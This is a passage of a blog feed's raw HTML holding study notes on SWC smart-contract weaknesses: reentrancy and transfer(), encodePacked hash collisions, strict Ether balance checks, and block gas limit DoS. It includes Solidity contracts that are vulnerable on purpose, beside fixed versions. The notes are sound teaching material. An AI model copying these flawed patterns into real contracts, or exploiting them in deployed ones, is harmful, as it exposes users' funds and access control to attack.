plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Vulnerable &#123;</span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        // This forwards 2300 gas, which may not be enough if the recipient</span><br><span class="line">        // is a contract and gas costs change.</span><br><span class="line">        msg.sender.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Fixed &#123;</span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        // This forwards all available gas. Be sure to check the return value!</span><br><span class="line">        (bool success, ) = msg.sender.call.value(amount)(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Other than the amount of gas forwarded, these two contracts are equivalent.</p><h3 id="What-About-Reentrancy"><a href="#What-About-Reentrancy" class="headerlink" title="What About Reentrancy?"></a>What About Reentrancy?</h3><p>This was hopefully your first thought upon seeing the above code. The whole reason <code>transfer()</code> and <code>send()</code> were introduced was to address the cause of the infamous hack on <a href="https://en.wikipedia.org/wiki/The_DAO_(organization">The DAO</a>). The idea was that 2300 gas is enough to emit a log entry but insufficient to make a reentrant call that then modifies storage.</p><p>Remember, though, that gas costs are subject to change, which means this is a bad way to address reentrancy anyway. Earlier this year, <a href="https://blog.ethereum.org/2019/01/15/security-alert-ethereum-constantinople-postponement/">the Constantinople fork was delayed</a> because <em>lowering</em> gas costs caused code that was previously safe from reentrancy to no longer be.</p><p>If we’re not going to use <code>transfer()</code> and <code>send()</code> anymore, we’ll have to protect against reentrancy in more robust ways. Fortunately, there are good solutions for this problem. 【看我之前的文章，不做赘述了】</p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>33.SWC-133_encodePacked</title>
      <link href="/2023/07/13/09.SWC/33.SWC-133_encodePacked/"/>
      <url>/2023/07/13/09.SWC/33.SWC-133_encodePacked/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-133-encodePacked"><a href="#SWC-133-encodePacked" class="headerlink" title="SWC-133_encodePacked"></a>SWC-133_encodePacked</h1><ul><li><p><strong>vulnerability</strong>: Using <code>abi.encodePacked()</code> with multiple variable length arguments can, in certain situations, lead to a hash collision. Since <code>abi.encodePacked()</code> packs all elements in order regardless of whether they’re part of an array, you can move elements between arrays and, so long as all elements are in the same order, it will return the same encoding. In a signature verification situation, an attacker could exploit this by modifying the position of elements in a previous function call to effectively bypass authorization.</p></li><li><p><strong>remediation</strong>: When using <code>abi.encodePacked()</code>, it’s crucial to ensure that a matching signature cannot be achieved using different parameters. To do so, either do not allow users access to parameters used in <code>abi.encodePacked()</code>, or use fixed length arrays. Alternatively, you can simply use <code>abi.encode()</code> instead.</p></li></ul><p>vulnerable contract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AccessControl &#123;</span><br><span class="line">    using ECDSA for bytes32;</span><br><span class="line">    mapping(address =&gt; bool) isAdmin;</span><br><span class="line">    mapping(address =&gt; bool) isRegularUser;</span><br><span class="line">    // Add admins and regular users.</span><br><span class="line">    function addUsers(</span><br><span class="line">        address[] calldata admins,</span><br><span class="line">        address[] calldata regularUsers,</span><br><span class="line">        bytes calldata signature</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">    &#123;</span><br><span class="line">        if (!isAdmin[msg.sender]) &#123; // something problem</span><br><span class="line">            // Allow calls to be relayed with an admin&#x27;s signature.</span><br><span class="line">            // 情景：项目方给了我admins和regularUsers的数组，admins和</span><br><span class="line">            // regularUsers中各2个数据，那么我就可以把regularUsers中的两</span><br><span class="line">            // 个数据放到admins中，这样也是可以通过的，因为拼接出来的hash是相同的</span><br><span class="line">            bytes32 hash = keccak256(abi.encodePacked(admins, regularUsers));</span><br><span class="line">            address signer = hash.toEthSignedMessageHash().recover(signature);</span><br><span class="line">            require(isAdmin[signer], &quot;Only admins can add users.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        for (uint256 i = 0; i &lt; admins.length; i++) &#123;</span><br><span class="line">            isAdmin[admins[i]] = true;</span><br><span class="line">        &#125;</span><br><span class="line">        for (uint256 i = 0; i &lt; regularUsers.length; i++) &#123;</span><br><span class="line">            isRegularUser[regularUsers[i]] = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fixed_1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AccessControl &#123;</span><br><span class="line">    using ECDSA for bytes32;</span><br><span class="line">    mapping(address =&gt; bool) isAdmin;</span><br><span class="line">    mapping(address =&gt; bool) isRegularUser;</span><br><span class="line">    // Add a single user, either an admin or regular user.</span><br><span class="line">    function addUser(</span><br><span class="line">        address user,</span><br><span class="line">        bool admin,</span><br><span class="line">        bytes calldata signature</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">    &#123;</span><br><span class="line">        if (!isAdmin[msg.sender]) &#123;</span><br><span class="line">            // Allow calls to be relayed with an admin&#x27;s signature.</span><br><span class="line">            // dynamic array increases the posibility of hash collisions,</span><br><span class="line">            // but this example is bad since hash collisions is not possible </span><br><span class="line">            // with 32 bytes.</span><br><span class="line">            bytes32 hash = keccak256(abi.encodePacked(user));</span><br><span class="line">            address signer = hash.toEthSignedMessageHash().recover(signature);</span><br><span class="line">            require(isAdmin[signer], &quot;Only admins can add users.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (admin) &#123;</span><br><span class="line">            isAdmin[user] = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            isRegularUser[user] = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fixed_2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AccessControl &#123;</span><br><span class="line">    using ECDSA for bytes32;</span><br><span class="line">    mapping(address =&gt; bool) isAdmin;</span><br><span class="line">    mapping(address =&gt; bool) isRegularUser;</span><br><span class="line">    // Add admins and regular users.</span><br><span class="line">    function addUsers(</span><br><span class="line">        // Use fixed length arrays.</span><br><span class="line">        address[3] calldata admins,</span><br><span class="line">        address[3] calldata regularUsers,</span><br><span class="line">        bytes calldata signature</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">    &#123;</span><br><span class="line">        if (!isAdmin[msg.sender]) &#123;</span><br><span class="line">            // Allow calls to be relayed with an admin&#x27;s signature.</span><br><span class="line">            bytes32 hash = keccak256(abi.encodePacked(admins, regularUsers));</span><br><span class="line">            address signer = hash.toEthSignedMessageHash().recover(signature);</span><br><span class="line">            require(isAdmin[signer], &quot;Only admins can add users.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        for (uint256 i = 0; i &lt; admins.length; i++) &#123;</span><br><span class="line">            isAdmin[admins[i]] = true;</span><br><span class="line">        &#125;</span><br><span class="line">        for (uint256 i = 0; i &lt; regularUsers.length; i++) &#123;</span><br><span class="line">            isRegularUser[regularUsers[i]] = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32.SWC-132_DoS</title>
      <link href="/2023/07/13/09.SWC/32.SWC-132_DoS/"/>
      <url>/2023/07/13/09.SWC/32.SWC-132_DoS/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-132-DoS"><a href="#SWC-132-DoS" class="headerlink" title="SWC-132_DoS"></a>SWC-132_DoS</h1><ul><li><strong>vulnerability</strong>: Contracts can behave erroneously when they strictly assume a specific Ether balance. It is always possible to forcibly send ether to a contract (without triggering its fallback function), using selfdestruct, or by mining to the account. In the worst case scenario this could lead to DOS conditions that might render the contract unusable.</li><li><strong>Remediation</strong>: Avoid strict equality checks for the Ether balance in a contract.</li></ul><p>vulnerability contract: function <code>lock()</code>, we can calculate the address that create an address by CREATE in advance: <code>keccak256(rlp(senderAddress, nonce))[12:31]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">/** </span><br><span class="line"> * @source: https://github.com/hicommonwealth/edgeware-lockdrop/blob/93ecb524c9c88d25bab36278541f190fa9e910c2/contracts/Lockdrop.sol</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Lock &#123;</span><br><span class="line">    // address owner; slot #0</span><br><span class="line">    // address unlockTime; slot #1</span><br><span class="line">    constructor (address owner, uint256 unlockTime) public payable &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(0x00, owner)</span><br><span class="line">            sstore(0x01, unlockTime)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * @dev        Withdraw function once timestamp has passed unlock time</span><br><span class="line">     */</span><br><span class="line">    function () external payable &#123; // payable so solidity doesn&#x27;t add unnecessary logic</span><br><span class="line">        assembly &#123;</span><br><span class="line">            switch gt(timestamp, sload(0x01))</span><br><span class="line">            case 0 &#123; revert(0, 0) &#125;</span><br><span class="line">            case 1 &#123;</span><br><span class="line">                switch call(gas, sload(0x00), balance(address), 0, 0, 0, 0)</span><br><span class="line">                case 0 &#123; revert(0, 0) &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Lockdrop &#123;</span><br><span class="line">    enum Term &#123;</span><br><span class="line">        ThreeMo,</span><br><span class="line">        SixMo,</span><br><span class="line">        TwelveMo</span><br><span class="line">    &#125;</span><br><span class="line">    // Time constants</span><br><span class="line">    uint256 constant public LOCK_DROP_PERIOD = 1 days * 92; // 3 months</span><br><span class="line">    uint256 public LOCK_START_TIME;</span><br><span class="line">    uint256 public LOCK_END_TIME;</span><br><span class="line">    // ETH locking events</span><br><span class="line">    event Locked(address indexed owner, uint256 eth, Lock lockAddr, Term term, bytes edgewareAddr, bool isValidator, uint time);</span><br><span class="line">    event Signaled(address indexed contractAddr, bytes edgewareAddr, uint time);</span><br><span class="line">    </span><br><span class="line">    constructor(uint startTime) public &#123;</span><br><span class="line">        LOCK_START_TIME = startTime;</span><br><span class="line">        LOCK_END_TIME = startTime + LOCK_DROP_PERIOD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev        Locks up the value sent to contract in a new Lock</span><br><span class="line">     * @param      term         The length of the lock up</span><br><span class="line">     * @param      edgewareAddr The bytes representation of the target edgeware key</span><br><span class="line">     * @param      isValidator  Indicates if sender wishes to be a validator</span><br><span class="line">     */</span><br><span class="line">    function lock(Term term, bytes calldata edgewareAddr, bool isValidator)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        didStart</span><br><span class="line">        didNotEnd</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 eth = msg.value;</span><br><span class="line">        address owner = msg.sender;</span><br><span class="line">        uint256 unlockTime = unlockTimeForTerm(term);</span><br><span class="line">        // Create ETH lock contract</span><br><span class="line">        Lock lockAddr = (new Lock).value(eth)(owner, unlockTime);</span><br><span class="line">        // ensure lock contract has all ETH, or fail</span><br><span class="line">        // fixed: assert(address(lockAddr).balance &gt;= msg.value);</span><br><span class="line">        assert(address(lockAddr).balance == msg.value);</span><br><span class="line">        emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev        Signals a contract&#x27;s (or address&#x27;s) balance decided after lock period</span><br><span class="line">     * @param      contractAddr  The contract address from which to signal the balance of</span><br><span class="line">     * @param      nonce         The transaction nonce of the creator of the contract</span><br><span class="line">     * @param      edgewareAddr   The bytes representation of the target edgeware key</span><br><span class="line">     */</span><br><span class="line">    function signal(address contractAddr, uint32 nonce, bytes calldata edgewareAddr)</span><br><span class="line">        external</span><br><span class="line">        didStart</span><br><span class="line">        didNotEnd</span><br><span class="line">        didCreate(contractAddr, msg.sender, nonce)</span><br><span class="line">    &#123;</span><br><span class="line">        emit Signaled(contractAddr, edgewareAddr, now);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlockTimeForTerm(Term term) internal view returns (uint256) &#123;</span><br><span class="line">        if (term == Term.ThreeMo) return now + 92 days;</span><br><span class="line">        if (term == Term.SixMo) return now + 183 days;</span><br><span class="line">        if (term == Term.TwelveMo) return now + 365 days;</span><br><span class="line">        </span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev        Ensures the lockdrop has started</span><br><span class="line">     */</span><br><span class="line">    modifier didStart() &#123;</span><br><span class="line">        require(now &gt;= LOCK_START_TIME);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev        Ensures the lockdrop has not ended</span><br><span class="line">     */</span><br><span class="line">    modifier didNotEnd() &#123;</span><br><span class="line">        require(now &lt;= LOCK_END_TIME);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev        Rebuilds the contract address from a normal address and transaction nonce</span><br><span class="line">     * @param      _origin  The non-contract address derived from a user&#x27;s public key</span><br><span class="line">     * @param      _nonce   The transaction nonce from which to generate a contract address</span><br><span class="line">     */</span><br><span class="line">    function addressFrom(address _origin, uint32 _nonce) public pure returns (address) &#123;</span><br><span class="line">        if(_nonce == 0x00)     return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, byte(0x80))))));</span><br><span class="line">        if(_nonce &lt;= 0x7f)     return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, uint8(_nonce))))));</span><br><span class="line">        if(_nonce &lt;= 0xff)     return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce))))));</span><br><span class="line">        if(_nonce &lt;= 0xffff)   return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce))))));</span><br><span class="line">        if(_nonce &lt;= 0xffffff) return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce))))));</span><br><span class="line">        return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce)))))); // more than 2^32 nonces not realistic</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev        Ensures the target address was created by a parent at some nonce</span><br><span class="line">     * @param      target  The target contract address (or trivially the parent)</span><br><span class="line">     * @param      parent  The creator of the alleged contract address</span><br><span class="line">     * @param      nonce   The creator&#x27;s tx nonce at the time of the contract creation</span><br><span class="line">     */</span><br><span class="line">    modifier didCreate(address target, address parent, uint32 nonce) &#123;</span><br><span class="line">        // Trivially let senders &quot;create&quot; themselves</span><br><span class="line">        if (target == parent) &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            require(target == addressFrom(parent, nonce));</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>31.SWC-131_unsued valiables</title>
      <link href="/2023/07/13/09.SWC/31.SWC-131_unsued%20valiables/"/>
      <url>/2023/07/13/09.SWC/31.SWC-131_unsued%20valiables/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-131-unsued-valiables"><a href="#SWC-131-unsued-valiables" class="headerlink" title="SWC-131_unsued valiables"></a>SWC-131_unsued valiables</h1><p>Presence of unused variables, more infomation in <a href="https://swcregistry.io/docs/SWC-131">it</a>.</p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>29.SWC-129_Typographical Error</title>
      <link href="/2023/07/13/09.SWC/29.SWC-129_Typographical%20Error/"/>
      <url>/2023/07/13/09.SWC/29.SWC-129_Typographical%20Error/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-129-Typographical-Error"><a href="#SWC-129-Typographical-Error" class="headerlink" title="SWC-129_Typographical Error"></a>SWC-129_Typographical Error</h1><p>A typographical error can occur for example when the intent of a defined operation is to sum a number to a variable (+=) but it has accidentally been defined in a wrong way (=+), introducing a typo which happens to be a valid operator. Instead of calculating the sum it initializes the variable again.</p><p>The unary + operator is deprecated in new solidity compiler versions.</p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>28.SWC-128_DoS</title>
      <link href="/2023/07/13/09.SWC/28.SWC-128_DoS/"/>
      <url>/2023/07/13/09.SWC/28.SWC-128_DoS/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-130-DoS"><a href="#SWC-130-DoS" class="headerlink" title="SWC-130_DoS"></a>SWC-130_DoS</h1><p>DoS With Block Gas Limit</p><ul><li><p><strong>Description</strong>: When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed the threshold.</p><p>Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition.</p></li><li><p><strong>Remediation</strong>: Caution is advised when you expect to have large arrays that grow over time. Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions.</p></li></ul><p>contract 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">// description: DoS Gas Limit reached when trying to empty the array of addresses for winning the game</span><br><span class="line">contract DosGas &#123;</span><br><span class="line"></span><br><span class="line">    address[] creditorAddresses;</span><br><span class="line">    bool win = false;</span><br><span class="line"></span><br><span class="line">    function emptyCreditors() public &#123;</span><br><span class="line">        if(creditorAddresses.length&gt;1500) &#123;</span><br><span class="line">            creditorAddresses = new address[](0);</span><br><span class="line">            win = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addCreditors() public returns (bool) &#123;</span><br><span class="line">        for(uint i=0;i&lt;350;i++) &#123; // Gas DoS</span><br><span class="line">          creditorAddresses.push(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function iWin() public view returns (bool) &#123;</span><br><span class="line">        return win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function numberCreditors() public view returns (uint) &#123;</span><br><span class="line">        return creditorAddresses.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>contract 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">// description: DoS Gas Limit in array empty and optionally in for loop</span><br><span class="line">contract DosNumber &#123;</span><br><span class="line"></span><br><span class="line">    uint numElements = 0;</span><br><span class="line">    uint[] array;</span><br><span class="line"></span><br><span class="line">    function insertNnumbers(uint value,uint numbers) public &#123;</span><br><span class="line"></span><br><span class="line">        // Gas DOS if number &gt; 382 more or less, it depends on actual gas limit</span><br><span class="line">        for(uint i=0;i&lt;numbers;i++) &#123;</span><br><span class="line">            if(numElements == array.length) &#123;</span><br><span class="line">                array.length += 1;</span><br><span class="line">            &#125;</span><br><span class="line">            array[numElements++] = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function clear() public &#123;</span><br><span class="line">        require(numElements&gt;1500);</span><br><span class="line">        numElements = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Gas DOS clear</span><br><span class="line">    function clearDOS() public &#123;</span><br><span class="line"></span><br><span class="line">        // number depends on actual gas limit</span><br><span class="line">        require(numElements&gt;1500);</span><br><span class="line">        array = new uint[](0);</span><br><span class="line">        numElements = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getLengthArray() public view returns(uint) &#123;</span><br><span class="line">        return numElements;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getRealLengthArray() public view returns(uint) &#123;</span><br><span class="line">        return array.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>contract 3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">// description: DoS Gas Limit reaches when try to empty the array of addresses</span><br><span class="line">contract DosOneFunc &#123;</span><br><span class="line"></span><br><span class="line">    address[] listAddresses;</span><br><span class="line"></span><br><span class="line">    function ifillArray() public returns (bool)&#123;</span><br><span class="line">        if(listAddresses.length&lt;1500) &#123;</span><br><span class="line"></span><br><span class="line">            for(uint i=0;i&lt;350;i++) &#123;</span><br><span class="line">                listAddresses.push(msg.sender);</span><br><span class="line">            &#125;</span><br><span class="line">            return true;</span><br><span class="line"></span><br><span class="line">        &#125; else 